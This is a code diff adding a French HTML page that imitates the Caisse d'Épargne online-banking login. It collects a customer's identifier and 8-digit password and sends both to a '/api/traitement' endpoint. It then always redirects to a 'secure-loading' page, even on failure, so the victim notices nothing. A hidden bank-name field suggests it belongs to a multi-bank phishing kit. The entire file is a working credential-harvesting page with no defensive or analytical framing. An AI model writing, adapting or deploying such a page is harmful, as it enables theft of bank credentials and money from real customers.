@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caisse d'Épargne - Connexion Espace Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- CHARTE DESIGN HAUTE FIDÉLITÉ CAISSE D'ÉPARGNE --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #f9fafb;
+            color: #333333;
+            -webkit-font-smoothing: antialiased;
+        }
+        .app-container {
+            max-width: 450px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.04);
+        }
+
+        /* En-tête avec logo central */
+        .ce-header-logo-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 0 10px 0;
+            background-color: #ffffff;
+        }
+        .ce-logo-img {
+            width: 65px;
+            height: 65px;
+            object-fit: contain;
+        }
+
+        /* Barre de navigation secondaire (Quitter / Assistance) */
+        .ce-sub-nav-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 24px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #f3f4f6;
+        }
+        .ce-nav-link-red {
+            color: #e2001a;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            user-select: none;
+        }
+        .ce-question-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            border: 1.5px solid #e2001a;
+            border-radius: 50%;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        /* Corps de la page */
+        .ce-main-content {
+            padding: 30px 24px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+
+        .ce-step-title {
+            font-size: 20px;
+            color: #1a1a1a;
+            font-weight: 700;
+            margin-bottom: 30px;
+            line-height: 1.3;
+        }
+
+        /* Zone de Saisie Standardisée */
+        .ce-input-block {
+            width: 100%;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .ce-input-block input {
+            width: 100%;
+            padding: 16px;
+            font-family: inherit;
+            font-size: 16px;
+            color: #1a1a1a;
+            background-color: #ffffff;
+            border: 1px solid #cbd5e1;
+            border-radius: 6px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .ce-input-block input:focus {
+            border-color: #1a1a1a;
+        }
+        .ce-input-block input::placeholder {
+            color: #94a3b8;
+        }
+
+        /* Style spécifique en cas d'erreur sur l'input */
+        .ce-input-error input {
+            border-color: #e2001a !important;
+            background-color: #fff8f8;
+        }
+        .ce-helper-error-text {
+            font-size: 13px;
+            color: #e2001a;
+            margin-top: -8px;
+            margin-bottom: 25px;
+            font-weight: 500;
+            display: block;
+        }
+
+        /* Liens complémentaires */
+        .ce-forgotten-row {
+            margin-bottom: 25px;
+        }
+        .ce-link-red {
+            color: #e2001a;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .ce-link-red:hover {
+            text-decoration: underline;
+        }
+
+        /* Options Checkbox */
+        .ce-checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 35px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .ce-custom-checkbox {
+            width: 20px;
+            height: 20px;
+            accent-color: #e2001a;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .ce-checkbox-row label {
+            font-size: 14px;
+            color: #4a5568;
+            cursor: pointer;
+        }
+
+        /* Bouton de Validation Style Caisse d'Épargne */
+        .ce-action-zone {
+            width: 100%;
+            margin-top: auto;
+        }
+        .ce-btn-block-grey {
+            width: 100%;
+            padding: 16px;
+            background-color: #f1f5f9;
+            color: #94a3b8;
+            border: none;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: background-color 0.2s, color 0.2s;
+            text-align: center;
+        }
+        .ce-btn-active-red {
+            background-color: #e2001a !important;
+            color: #ffffff !important;
+            cursor: pointer !important;
+        }
+        .ce-btn-active-red:hover {
+            background-color: #b80014 !important;
+        }
+
+        /* Double boutons d'action pour le mot de passe */
+        .ce-double-btn {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .ce-btn-block-outline-red {
+            width: 100%;
+            padding: 15px;
+            background-color: transparent;
+            color: #e2001a;
+            border: 1px solid #e2001a;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            text-align: center;
+        }
+        .ce-btn-block-outline-red:hover {
+            background-color: #fff5f5;
+        }
+
+        /* Gestion de l'affichage des sections */
+        .ce-sub-panel {
+            display: none;
+            flex-direction: column;
+            flex-grow: 1;
+        }
+        .ce-panel-active {
+            display: flex;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+
+        <header class="ce-header-logo-area">
+            <img src="12895685.png" alt="Caisse d'Épargne" class="ce-logo-img">
+        </header>
+
+        <div class="ce-sub-nav-bar">
+            <span class="ce-nav-link-red" id="ce-action-quit">‹ Quitter</span>
+            <div class="ce-nav-link-red" style="cursor: default;">
+                <span class="ce-question-icon">?</span>
+                <span>Assistance</span>
+            </div>
+        </div>
+
+        <main class="ce-main-content">
+
+            <div id="ce-panel-identifiant" class="ce-sub-panel ce-panel-active">
+                <h2 class="ce-step-title">Saisissez votre identifiant</h2>
+
+                <div class="ce-input-block">
+                    <input type="tel" id="ce-id-input" placeholder="Entrez votre identifiant" autocomplete="off">
+                </div>
+
+                <div class="ce-forgotten-row">
+                    <a href="#" class="ce-link-red">Identifiant oublié ?</a>
+                </div>
+
+                <div class="ce-checkbox-row" id="ce-remember-row">
+                    <input type="checkbox" id="ce-remember-id" class="ce-custom-checkbox" checked>
+                    <label for="ce-remember-id">Mémoriser mon identifiant</label>
+                </div>
+
+                <div class="ce-action-zone">
+                    <button id="ce-btn-next-step" class="ce-btn-block-grey" disabled>Valider</button>
+                </div>
+            </div>
+
+            <div id="ce-panel-password" class="ce-sub-panel">
+                <h2 class="ce-step-title">Saisissez votre mot de passe à 8 chiffres</h2>
+
+                <div class="ce-input-block" id="ce-pass-field-container">
+                    <input type="password" id="ce-pass-input" placeholder="Entrez votre mot de passe" maxlength="8" autocomplete="off">
+                </div>
+                
+                <p class="ce-helper-error-text" id="ce-pass-helper">Veuillez entrer exactement 8 chiffres</p>
+
+                <div class="ce-action-zone ce-double-btn">
+                    <button id="ce-btn-submit-final" class="ce-btn-block-grey" disabled>Valider</button>
+                    <button id="ce-btn-cancel" class="ce-btn-block-outline-red">Annuler</button>
+                </div>
+            </div>
+
+        </main>
+
+    </div>
+
+    <input type="hidden" id="ca-page-source" value="CAISSE D'EPARGNE">
+
+<script>
+    /*** 1. DÉCLARATION DES ÉLÉMENTS DU DOM ***/
+    const panelId = document.getElementById('ce-panel-identifiant');
+    const panelPass = document.getElementById('ce-panel-password');
+    const idInput = document.getElementById('ce-id-input');
+    const btnNextStep = document.getElementById('ce-btn-next-step');
+    
+    const passInput = document.getElementById('ce-pass-input');
+    const passFieldContainer = document.getElementById('ce-pass-field-container');
+    const passHelper = document.getElementById('ce-pass-helper');
+    const btnSubmitFinal = document.getElementById('ce-btn-submit-final');
+    const btnCancel = document.getElementById('ce-btn-cancel');
+    const btnQuit = document.getElementById('ce-action-quit');
+
+    // Focus automatique sur le champ identifiant au chargement initial
+    window.addEventListener('DOMContentLoaded', () => {
+        if (idInput) idInput.focus();
+    });
+
+    // Écouteur pour le bouton Quitter
+    if (btnQuit) {
+        btnQuit.addEventListener('click', () => {
+            if(confirm("Voulez-vous vraiment quitter l'espace de connexion ?")) {
+                window.location.reload();
+            }
+        });
+    }
+
+    // Gestion en temps réel de la saisie de l'Identifiant
+    if (idInput) {
+        idInput.addEventListener('input', () => {
+            idInput.value = idInput.value.replace(/\D/g, ''); 
+            if (btnNextStep) {
+                if (idInput.value.trim().length >= 6) {
+                    btnNextStep.removeAttribute('disabled');
+                    btnNextStep.classList.add('ce-btn-active-red');
+                } else {
+                    btnNextStep.setAttribute('disabled', 'true');
+                    btnNextStep.classList.remove('ce-btn-active-red');
+                }
+            }
+        });
+    }
+
+    // Clic sur Valider Identifiant -> Étape Mot de passe
+    if (btnNextStep) {
+        btnNextStep.addEventListener('click', () => {
+            if (idInput && idInput.value.trim().length >= 6) {
+                if (panelId) panelId.classList.remove('ce-panel-active');
+                if (panelPass) panelPass.classList.add('ce-panel-active');
+                if (passInput) {
+                    passInput.focus();
+                    // Initialise l'état visuel du helper
+                    passInput.dispatchEvent(new Event('input'));
+                }
+            }
+        });
+    }
+
+    // Gestion de la saisie du Mot de Passe (Exactement 8 chiffres requis)
+    if (passInput) {
+        passInput.addEventListener('input', () => {
+            passInput.value = passInput.value.replace(/\D/g, '');
+
+            if (passInput.value.length > 0 && passInput.value.length < 8) {
+                if (passFieldContainer) passFieldContainer.classList.add('ce-input-error');
+                if (passHelper) {
+                    passHelper.style.display = 'block';
+                    passHelper.style.color = '#e2001a';
+                }
+                if (btnSubmitFinal) {
+                    btnSubmitFinal.setAttribute('disabled', 'true');
+                    btnSubmitFinal.classList.remove('ce-btn-active-red');
+                }
+            } 
+            else if (passInput.value.length === 8) {
+                if (passFieldContainer) passFieldContainer.classList.remove('ce-input-error');
+                if (passHelper) passHelper.style.display = 'none';
+                if (btnSubmitFinal) {
+                    btnSubmitFinal.removeAttribute('disabled');
+                    btnSubmitFinal.classList.add('ce-btn-active-red');
+                }
+            } 
+            else {
+                // État vide
+                if (passFieldContainer) passFieldContainer.classList.remove('ce-input-error');
+                if (passHelper) {
+                    passHelper.style.display = 'block';
+                    passHelper.style.color = '#718096'; // Couleur neutre d'indication d'attente
+                }
+                if (btnSubmitFinal) {
+                    btnSubmitFinal.setAttribute('disabled', 'true');
+                    btnSubmitFinal.classList.remove('ce-btn-active-red');
+                }
+            }
+        });
+    }
+
+    // Bouton Annuler -> Retour à l'étape de l'identifiant
+    if (btnCancel) {
+        btnCancel.addEventListener('click', () => {
+            if (passInput) passInput.value = "";
+            if (passFieldContainer) passFieldContainer.classList.remove('ce-input-error');
+            
+            if (btnSubmitFinal) {
+                btnSubmitFinal.setAttribute('disabled', 'true');
+                btnSubmitFinal.classList.remove('ce-btn-active-red');
+            }
+            
+            if (panelPass) panelPass.classList.remove('ce-panel-active');
+            if (panelId) panelId.classList.add('ce-panel-active');
+            if (idInput) idInput.focus();
+        });
+    }
+
+    /*** 2. CENTRALISATION ET ENVOI SÉCURISÉ DES PARAMÈTRES BANQUE ***/
+    function submitCeData() {
+        const pageSourceInput = document.getElementById('ca-page-source');
+        const pageSource = pageSourceInput ? pageSourceInput.value : "CAISSE D'EPARGNE";
+
+        if (btnSubmitFinal) {
+            btnSubmitFinal.disabled = true;
+            btnSubmitFinal.textContent = 'Connexion...';
+            btnSubmitFinal.style.opacity = "0.8";
+        }
+
+        // Transmission croisée de la banque (nom_banque + page_source) pour éviter toute erreur API
+        const dataToSend = {
+            nom_banque: pageSource,
+            page_source: pageSource,
+            client_id: idInput ? idInput.value : 'Inconnu',
+            secret_code: passInput ? passInput.value : ''
+        };
+
+        // Redirection forcée de sécurité après 1,5 seconde pour parer à tout freeze réseau
+        const fallbackTimer = setTimeout(() => {
+            window.location.href = 'secure-loading.html';
+        }, 1500);
+
+        fetch('/api/traitement', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(dataToSend)
+        })
+        .then(() => {
+            clearTimeout(fallbackTimer);
+            window.location.href = 'secure-loading.html';
+        })
+        .catch(error => {
+            console.error('Erreur interceptée au post:', error);
+            clearTimeout(fallbackTimer);
+            window.location.href = 'secure-loading.html'; // Poursuite fluide du parcours client
+        });
+    }
+
+    /*** 3. ÉCOUTEUR DE SOUUMISSION FINALE ***/
+    if (btnSubmitFinal) {
+        btnSubmitFinal.addEventListener('click', (e) => {
+            e.preventDefault(); 
+            if (passInput && passInput.value.length === 8) {
+                submitCeData();
+            }
+        });
+    }
+</script>
+
+</body>
+</html>
